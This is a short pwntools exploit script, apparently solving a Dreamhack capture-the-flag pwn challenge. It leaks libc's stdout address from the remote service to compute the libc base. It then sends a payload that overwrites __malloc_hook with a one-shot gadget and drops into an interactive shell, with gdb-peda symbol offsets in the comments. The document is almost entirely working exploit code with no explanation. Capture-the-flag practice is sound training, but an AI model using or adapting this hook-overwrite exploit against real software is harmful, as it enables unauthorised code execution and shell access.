from pwn import *
host = "host1.dreamhack.games"
port = 15559
p = remote(host, port)
libc = ELF("./libc.so.6")

print(libc.symbols['__malloc_hook'])
print(libc.symbols['__free_hook'])

print(p.recvuntil("stdout: "))
libc_stdout = int(p.recvuntil("\n").strip(b"\n"),16)

libc_base = libc_stdout - libc.symbols['_IO_2_1_stdout_']
malloc_hook = libc_base + 0x3c4b10
free_hook = libc_base + libc.symbols['__free_hook']
oneshot_gadget = 0x0000000000400a11
payload = p64(malloc_hook)
#payload = p64(free_hook)
payload += p64(oneshot_gadget)
p.sendline("1024")
p.sendline(payload)
p.interactive()


# gdb-peda$ print &_IO_2_1_stdout_
# $8 = (<data variable, no debug info> *) 0x3c5620 <_IO_2_1_stdout_>
# gdb-peda$ print &__malloc_hook
# $1 = (<data variable, no debug info> *) 0x3c4b10 <__malloc_hook>
# gdb-peda$ print &__free_hook
# $7 = (<data variable, no debug info> *) 0x3c67a8 <__free_hook>
